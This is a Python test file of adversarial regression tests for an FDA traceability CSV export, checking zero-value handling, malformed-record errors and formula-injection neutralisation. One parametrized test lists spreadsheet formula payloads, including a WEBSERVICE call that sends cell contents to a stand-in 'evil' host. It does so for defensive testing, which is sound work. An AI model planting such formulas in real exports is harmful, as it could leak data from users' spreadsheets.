"""Adversarial regression tests for the compliance FDA spreadsheet.

Break-it findings (Oct 2026) against ``app/fsma_spreadsheet.py`` and
``app/routes.py``:

* Falsy-but-real values (``quantity=0``) were dropped by ``or``-chains
  and exported as blank cells, rewriting shipment facts.
* A truthy non-object ``kdes`` (stored string, number or list) crashed
  ``_normalise_event`` with ``AttributeError``, surfacing as an
  unhandled HTTP 500 for the whole export window.

Also locks in probed no-break behavior: formula prefixes stay
neutralized end to end, semicolon-bearing values round-trip intact,
exactly 50,000 events still exports 200, and the CSV content type
carries an explicit UTF-8 charset.
"""

from __future__ import annotations

import csv
import io
import json
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

service_dir = Path(__file__).parent.parent
for key in [k for k in sys.modules if k == "app" or k.startswith("app.") or k == "main"]:
    del sys.modules[key]
sys.path.insert(0, str(service_dir))

pytest.importorskip("fastapi")

from app.fsma_spreadsheet import (  # noqa: E402
    FSMAEventError,
    _normalise_event,
    generate_fda_csv,
)
from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402


def _event(**overrides) -> dict:
    base = {
        "type": "SHIPPING",
        "tlc": "TLC-001",
        "product_description": "Romaine",
        "quantity": 100,
        "uom": "cases",
        "kdes": {"event_date": "2026-04-10T10:00:00+00:00"},
    }
    base.update(overrides)
    return base


# ---------------------------------------------------------------------------
# Falsy-but-real values must survive normalization
# ---------------------------------------------------------------------------


def test_zero_quantity_exports_as_zero_not_blank():
    row = _normalise_event(_event(quantity=0))
    assert row["quantity"] == "0"


def test_zero_quantity_falls_back_only_when_missing():
    assert _normalise_event(_event())["quantity"] == "100"
    assert _normalise_event({"type": "SHIPPING", "kdes": {}})["quantity"] == ""
    row = _normalise_event({"type": "SHIPPING", "quantity": None, "kdes": {"quantity": 7}})
    assert row["quantity"] == "7"


def test_zero_valued_text_and_kde_fields_are_kept():
    row = _normalise_event(
        _event(
            product_description=0,
            kdes={"event_date": "2026-04-10T10:00:00+00:00", "temperature": 0, "custom": 0},
        )
    )
    assert row["product_description"] == "0"
    assert row["temperature"] == "0"
    assert json.loads(row["additional_kdes_json"])["custom"] == 0


def test_zero_quantity_reaches_the_csv():
    text = generate_fda_csv([_event(quantity=0)])
    rows = list(csv.reader(io.StringIO(text)))
    header = next(r for r in rows if r and r[0] == "Event Type (CTE)")
    data = [r for r in rows[rows.index(header) + 1 :] if r and r[0]]
    assert len(data) == 1
    assert data[0][header.index("Quantity")] == "0"


# ---------------------------------------------------------------------------
# Malformed record shapes fail loudly, never 500
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("kdes", ["planted", 42, ["x"], ("t",)])
def test_non_object_kdes_raises_fsma_event_error(kdes):
    with pytest.raises(FSMAEventError):
        _normalise_event(_event(kdes=kdes))


@pytest.mark.parametrize("event", [None, "x", 42, ["SHIPPING"]])
def test_non_object_event_raises_fsma_event_error(event):
    with pytest.raises(FSMAEventError):
        _normalise_event(event)


def test_falsy_kdes_still_means_no_kdes():
    assert _normalise_event(_event(kdes=[]))["additional_kdes_json"] == ""
    assert _normalise_event(_event(kdes=None))["additional_kdes_json"] == ""


def test_generate_csv_propagates_shape_error():
    with pytest.raises(FSMAEventError):
        generate_fda_csv([_event(kdes="planted")])


# ---------------------------------------------------------------------------
# Locked-in no-break behavior from the same adversarial pass
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(A1:A2)",
        '=HYPERLINK("http://evil","x")',
        '=WEBSERVICE("http://evil/?x="&A1)',
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_formula_payloads_neutralized_end_to_end(payload):
    from shared.fda_export.csv_safety import DANGEROUS_PREFIXES

    text = generate_fda_csv([_event(product_description=payload)])
    for crow in csv.reader(io.StringIO(text)):
        for cell in crow:
            assert not (cell and cell[0] in DANGEROUS_PREFIXES), cell


def test_semicolon_values_round_trip_intact():
    text = generate_fda_csv([_event(tlc="TLC;001", product_description="a;b;c")])
    rows = list(csv.reader(io.StringIO(text)))
    header = next(r for r in rows if r and r[0] == "Event Type (CTE)")
    assert len(header) == 29
    data = [r for r in rows[rows.index(header) + 1 :] if r and r[0]]
    assert len(data) == 1 and len(data[0]) == 29
    assert data[0][header.index("Traceability Lot Code (TLC)")] == "TLC;001"
    assert data[0][header.index("Product Description")] == "a;b;c"


# ---------------------------------------------------------------------------
# Route-level behavior
# ---------------------------------------------------------------------------


@pytest.fixture()
def client():
    from app import routes as routes_mod
    from shared.auth import require_api_key

    class _StubPrincipal:
        tenant_id = "11111111-1111-1111-1111-111111111111"
        key_id = "test-key"

    app = FastAPI()
    app.include_router(routes_mod.router)
    app.dependency_overrides[require_api_key] = lambda: _StubPrincipal()
    with TestClient(app, raise_server_exceptions=False) as c:
        c._routes_mod = routes_mod  # type: ignore[attr-defined]
        yield c


def _patch_events(client, events):
    return patch.object(client._routes_mod, "_load_fsma_audit_events", return_value=events)  # type: ignore[attr-defined]


@pytest.mark.parametrize("kdes", ["planted", 42, ["x"]])
def test_route_malformed_kdes_is_400_not_500(client, kdes):
    with _patch_events(client, [_event(kdes=kdes)]):
        r = client.get(
            "/v1/fsma/audit/spreadsheet",
            params={"start_date": "2026-04-01", "end_date": "2026-04-17"},
        )
    assert r.status_code == 400
    assert "malformed" in r.json()["detail"].lower()
    assert "Content-Disposition" not in r.headers


def test_route_zero_quantity_is_zero(client):
    with _patch_events(client, [_event(quantity=0)]):
        r = client.get(
            "/v1/fsma/audit/spreadsheet",
            params={"start_date": "2026-04-01", "end_date": "2026-04-17"},
        )
    assert r.status_code == 200
    rows = list(csv.reader(io.StringIO(r.text)))
    header = next(x for x in rows if x and x[0] == "Event Type (CTE)")
    data = [x for x in rows[rows.index(header) + 1 :] if x and x[0]]
    assert data[0][header.index("Quantity")] == "0"


def test_route_exact_cap_exports_200_with_every_row(client):
    events = [
        {
            "type": "SHIPPING",
            "tlc": f"TLC-{i:05d}",
            "quantity": 1,
            "uom": "cases",
            "kdes": {"event_date": "2026-04-10T10:00:00+00:00"},
        }
        for i in range(50_000)
    ]
    with _patch_events(client, events):
        r = client.get(
            "/v1/fsma/audit/spreadsheet",
            params={"start_date": "2026-04-01", "end_date": "2026-04-17"},
        )
    assert r.status_code == 200
    assert sum(1 for line in r.text.splitlines() if "TLC-" in line) == 50_000


def test_route_csv_content_type_declares_utf8(client):
    with _patch_events(client, [_event(product_description="Caf\u00e9 34\u00b0F")]):
        r = client.get(
            "/v1/fsma/audit/spreadsheet",
            params={"start_date": "2026-04-01", "end_date": "2026-04-17"},
        )
    assert r.status_code == 200
    assert "charset=utf-8" in r.headers["content-type"].lower()
    assert "Caf\u00e9 34\u00b0F" in r.text
